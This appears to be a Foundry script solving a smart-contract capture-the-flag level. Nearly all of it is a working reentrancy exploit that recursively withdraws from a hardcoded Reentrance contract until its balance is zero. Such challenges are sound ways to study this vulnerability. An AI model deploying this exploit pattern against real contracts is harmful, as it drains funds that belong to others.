// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Reenterer {
    Reentrance public constant reentranceInstance =
        Reentrance(0x6b58f8CFfde17c7C90Bad253A301DFeD29E3efd8);

    function attack() external payable {
        reentranceInstance.donate{value: msg.value}(address(this));
        reentranceInstance.withdraw(msg.value);
    }

    receive() external payable {
        reentranceInstance.withdraw(msg.value);
    }
}

contract ReentranceSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Reenterer reenterer = new Reenterer();
        reenterer.attack{value: 0.001 ether}();
        require(address(reenterer.reentranceInstance()).balance == 0);
        vm.stopBroadcast();
    }
}
